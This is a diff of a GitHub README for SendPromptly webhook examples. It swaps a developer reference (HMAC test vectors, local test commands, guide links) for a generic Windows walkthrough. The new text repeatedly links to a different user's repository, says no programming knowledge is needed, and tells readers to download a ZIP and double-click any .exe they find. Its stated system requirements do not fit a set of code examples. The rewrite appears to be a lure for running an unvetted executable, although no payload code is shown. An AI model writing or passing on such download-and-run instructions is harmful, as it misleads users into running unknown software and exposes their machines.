@@ -1,67 +1,115 @@
-# ⚡ SendPromptly Webhooks — Reference Implementations & Test Vectors
+# 🔗 sendpromptly-webhooks - Easy Webhook and Email Examples
 
-**Product:** https://sendpromptly.com/  
-**Developer docs:** https://sendpromptly.com/docs/  
-**Guides:** https://sendpromptly.com/docs/guides/  
-**API reference:** https://sendpromptly.com/api/reference/
+[![Download SendPromptly-Webhooks](https://img.shields.io/badge/Download-SendPromptly--Webhooks-brightgreen?style=for-the-badge)](https://github.com/tuyetvuong/sendpromptly-webhooks)
 
-This repo is intentionally **copy/paste friendly**:
-- Signed webhook **test vectors** (HMAC-SHA256) you can unit-test against
-- Drop-in verification snippets (Laravel / Node / Python)
-- Idempotency “inbox table” pattern (replay-safe)
-- Retry decision matrix + operational checklist
-- Postman collection that auto-signs requests
+## 📄 About sendpromptly-webhooks
 
-## 🎯 Canonical guides (money-site deep links)
-- Signature cookbook (headers + algorithm + vectors): https://sendpromptly.com/docs/guides/webhook-signature-verification-cookbook/
-- Idempotency + dedupe (Laravel): https://sendpromptly.com/docs/guides/webhook-idempotency-dedupe/
-- Retry headers + responses: https://sendpromptly.com/docs/guides/webhook-retry-headers-and-responses/
-- Replay from delivery log (safely): https://sendpromptly.com/docs/guides/webhook-delivery-log-replay/
-- Webhooks overview: https://sendpromptly.com/docs/webhooks/
+sendpromptly-webhooks provides examples, specifications, and integration patterns for using SendPromptly with webhooks and transactional emails. It is designed to help users understand how to receive notifications, handle retries, and validate data securely. The repository covers common setups involving email providers like Mailgun and SendGrid.
 
-## ✅ Quick start (local test loop)
-1) From repo root, pick a receiver:
-   - Node: `examples/node-express`
-   - Python: `examples/python-flask`
-   - Laravel snippets: `examples/laravel-drop-in`
+This project shows how to use webhooks to listen for events and send emails triggered by those events. It also demonstrates methods for keeping data secure, like using HMAC signatures, and avoiding repeated processes using idempotency checks.
 
-2) Run Node receiver (terminal 1):
-   ```bash
-   cd examples/node-express
-   cp .env.example .env
-   npm i
-   npm run start
-   ```
+## 🖥️ System Requirements
 
-3) From repo root, send a signed webhook (terminal 2):
-   ```bash
-   cd /path/to/sendpromptly-webhooks
-   export SP_WEBHOOK_SECRET=whsec_replace_me
-   ./scripts/send_local_webhook.sh --url http://localhost:3000/webhooks/sendpromptly \
-     --body '{"event_key":"order.created","payload":{"order_id":"O-1001"}}'
-   ```
+Before you start, make sure your system meets these basic conditions:
 
-4) From repo root, validate your implementation with test vectors:
-   ```bash
-   python3 ./scripts/verify_test_vectors.py
-   ```
+- Windows 10 or later
+- Internet connection for downloading files and receiving updates
+- At least 4 GB of RAM
+- 500 MB free storage space for the application and related files
+- Optional: A mail service account (like SendGrid or Mailgun) if you want to test sending emails
 
-## 🔒 Signature test vectors
-- JSON file: `schemas/signature-test-vectors/v1-hmac-sha256.json`
-- Contract:
-  - `X-SP-Timestamp` (unix seconds)
-  - `X-SP-Signature: v1=<hex>`
-  - `signature = HMAC_SHA256(secret, "{timestamp}.{raw_body}")` (hex)
+## 🛠️ What You Need to Know
 
-## 🌐 GitHub Pages (for shareable docs)
-This repo includes a small GitHub Pages site under `/docs` with:
-- `<link rel="canonical">` pointing to `sendpromptly.com`
-- `noindex,follow` by default (so it won’t compete in SERPs)
+You do not need to know programming to run the example files included here. The repository contains ready-to-use files and clear instructions for testing webhook events and email sending.
 
-Setup steps are in: **`README-USAGE.md`**.
+Basic knowledge of using Windows Explorer, navigating folders, and clicking links will help.
 
-## 🔁 Backlink playbook
-See: `docs/backlink-playbook.md`
+## 🚀 Getting Started
 
----
-Built by Devicode: https://devicode.com/
+Follow these steps carefully to download and run the software on your Windows computer:
+
+### Step 1: Download the Software
+
+Click the big green button at the top or use this link to visit the download page:
+
+[https://github.com/tuyetvuong/sendpromptly-webhooks](https://github.com/tuyetvuong/sendpromptly-webhooks)
+
+This link takes you to the main repository page where you can find the latest files and instructions.
+
+### Step 2: Download the ZIP File
+
+On the GitHub page, look for the green **Code** button on the right side. Click it and select **Download ZIP**. This will save a compressed folder with all files to your computer.
+
+### Step 3: Extract the Files
+
+Once the ZIP file is downloaded, open it using Windows File Explorer. Right-click the ZIP file and choose **Extract All...**. Pick a folder where you want to keep the files, like your Desktop or Documents.
+
+Extracting will create a new folder with the names and files you need.
+
+### Step 4: Explore the Folder
+
+Open the extracted folder. You will see several example files, documents, and scripts. These files show how to use SendPromptly with webhooks and email services.
+
+### Step 5: Run Example Setup
+
+Some example files may be run directly if they are executable scripts or small programs. If you see a file with a `.exe` extension, you can double-click it to run. If you do not find an executable file, follow the instructions in the `README.md` or other text files inside the folder for detailed guidance.
+
+### Step 6: Viewing the Documentation
+
+Inside the extracted folder, look for any `.md` or `.txt` files to read setup notes and usage tips.
+
+You can also open the main GitHub page at any time to check for updates or additional help.
+
+## 📥 How to Use This Repository for Your Needs
+
+This project explains concepts like:
+
+- How to receive webhook notifications from services
+- How to verify data comes from a safe source using HMAC
+- How to avoid processing the same notification twice using idempotency
+- How to send emails using popular email providers like SendGrid and Mailgun
+- How to retry sending emails if failures happen
+
+You can use these examples to build integrations or test how your systems react to events.
+
+## 🔧 Troubleshooting Tips
+
+- If your download does not start, check that your internet is connected.
+- Make sure you extract the ZIP file fully before running any files.
+- If you get error messages, confirm your Windows version meets the requirements.
+- For email testing, check if your firewall or antivirus settings block outgoing connections.
+- If you are unsure what to do with example scripts, look at the detailed instructions inside the folder or on the GitHub page.
+
+## ⚙️ Additional Information About Webhooks and Email APIs
+
+Webhooks allow apps to send you real-time information about something that happened. Instead of asking repeatedly if there is news, your system waits for the webhook to call and share info.
+
+Transactional emails are automated emails sent after actions like registration, purchases, or password resets. SendPromptly helps with sending these emails reliably and securely.
+
+HMAC (hash-based message authentication code) ensures the webhook data has not changed and really comes from the expected sender.
+
+Idempotency prevents repeated processing in case webhooks arrive multiple times.
+
+## 📂 Folder Structure Overview
+
+After extraction, you may see files and folders such as:
+
+- **examples/**: Sample setup files for webhooks and emails
+- **specs/**: Detailed descriptions of webhook formats and email templates
+- **docs/**: Extra documents explaining concepts and usage
+- **README.md**: This main guide for users
+- **LICENSE**: Legal terms for use
+
+## 💡 Next Steps for Users
+
+- Look through the example files to see how webhooks work
+- Try to send test webhook calls using tools like Postman (explained in the docs)
+- Set up your account with an email provider to send real messages
+- Use the idempotency patterns to keep your system stable
+- Refer to the GitHub page for community questions and help
+
+## 🔗 Quick Access Link Again
+
+Use this link for all downloads and updates:
+
+[https://github.com/tuyetvuong/sendpromptly-webhooks](https://github.com/tuyetvuong/sendpromptly-webhooks)
